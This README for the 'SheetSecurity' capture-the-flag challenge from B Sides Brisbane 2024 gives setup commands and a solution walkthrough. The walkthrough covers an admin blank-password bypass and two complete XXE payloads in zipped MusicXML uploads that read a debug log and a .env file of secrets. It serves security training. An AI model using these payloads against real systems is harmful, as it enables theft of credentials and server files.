# SheetSecurity

CTF challenge for B Sides Brisbane 2024

## Setup

(todo)

```bash
# build
docker build -t sheet_security_image .
# run
docker run --rm -d -p 8000:8000 --name sheet_security sheet_security_image
```

## Walkthrough (short)

Quick solve:

- Admin auth as `admin/<blank>`, bypassing the UI requirement for a password
- Work out path to potential debug log
- Use XXE in (zipped xml) file upload to read that log file
- See a reference to a .env file and combine that with knowledge of the python script's path (from the info log)
- Use XXE to read `.env` and get the flag

## Walkthrough (long)

Expected path:

- Click on Admin Logon
- See clue that username is probably `admin`
- Attempt common techniques for bypassing auth e.g.
    - SQLi
    - admin/admin
    - brute force
    - no password
- Observe that the UI requires a password
- Try authenticating with a blank password
    - using Burp, curl etc. or by editing the DOM to remove `required` from the password field
    - the reason this works is because of flawed validation logic on the server - **not** because the password is actually blank
- Authenticate as `admin/<blank>`
- Observe that you're getting INFO, WARNING and ERROR logs
- Observe the file path convention for logs
- Deduce there might be a debug log at `/var/log/sheetsec-debug.log`
- Head back to the main page and realise you have file upload for mxl files
    - Research mxl - it's zipped .musicxml, which is just xml
    - There's a file you want to read (the debug log), so try XXE
- Craft an mxl file (zipped xml) with xxe to read that file
    - either place the payload in an xml field where the music renderer will display it (e.g. `<work-title>`) or place it anywhere and use the `Download watermarked file` button to download a copy of the `.musicxml` file with the XXE rendered
- View the log file and spot `Sourcing .env`
- Recall that the info log revealed the full path of the running py file
- Combine that path with .env to read the .env file using XXE, again
- View the .env file and get the flag - the admin's password

## XML to read the debug log

Remember to convert this .musicxml file to .mxl by zipping it.

```bash
zip read-debug-log.mxl read-debug-log.musicxml
```

Musicxml content:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd" [<!ENTITY xxe SYSTEM "file:///var/log/sheetsec-debug.log"> ]>
<score-partwise version="3.0">
<movement-title>Prelude to a Tragedy - &xxe;</movement-title>
  <part-list>
    <score-part id="P1">
      <part-name/>
    </score-part>
  </part-list>
  <part id="P1">
    <measure number="1">
      <attributes>
        <divisions>4</divisions>
        <key>
          <fifths>0</fifths>
          <mode>major</mode>
        </key>
        <time>
          <beats>4</beats>
          <beat-type>4</beat-type>
        </time>
        <clef>
          <sign>G</sign>
          <line>2</line>
        </clef>
      </attributes>
      <note>
        <duration>16</duration>
        <pitch>
          <step>A</step>
          <octave>4</octave>
        </pitch>
      </note>
    </measure>
    <measure number="2">
      <note>
        <duration>16</duration>
        <pitch>
          <step>D</step>
          <octave>5</octave>
        </pitch>
      </note>
    </measure>
    <measure number="3">
      <note>
        <duration>16</duration>
        <pitch>
          <step>A</step>
          <octave>4</octave>
        </pitch>
      </note>
    </measure>
    <measure number="4">
      <note measure="yes">
        <rest/>
        <duration>16</duration>
      </note>
    </measure>
  </part>
</score-partwise>
```

## XML to read the .env file

Remember to convert this .musicxml file to .mxl by zipping it.

```bash
zip read-dot-env.mxl read-dot-env.musicxml
```

Musicxml content:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 3.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd" [<!ENTITY xxe SYSTEM "file:///code/src/.env"> ]>
<score-partwise version="3.0">
<movement-title>Prelude to a Tragedy - &xxe;</movement-title>
  <part-list>
    <score-part id="P1">
      <part-name/>
    </score-part>
  </part-list>
  <part id="P1">
    <measure number="1">
      <attributes>
        <divisions>4</divisions>
        <key>
          <fifths>0</fifths>
          <mode>major</mode>
        </key>
        <time>
          <beats>4</beats>
          <beat-type>4</beat-type>
        </time>
        <clef>
          <sign>G</sign>
          <line>2</line>
        </clef>
      </attributes>
      <note>
        <duration>16</duration>
        <pitch>
          <step>A</step>
          <octave>4</octave>
        </pitch>
      </note>
    </measure>
    <measure number="2">
      <note>
        <duration>16</duration>
        <pitch>
          <step>D</step>
          <octave>5</octave>
        </pitch>
      </note>
    </measure>
    <measure number="3">
      <note>
        <duration>16</duration>
        <pitch>
          <step>A</step>
          <octave>4</octave>
        </pitch>
      </note>
    </measure>
    <measure number="4">
      <note measure="yes">
        <rest/>
        <duration>16</duration>
      </note>
    </measure>
  </part>
</score-partwise>
```
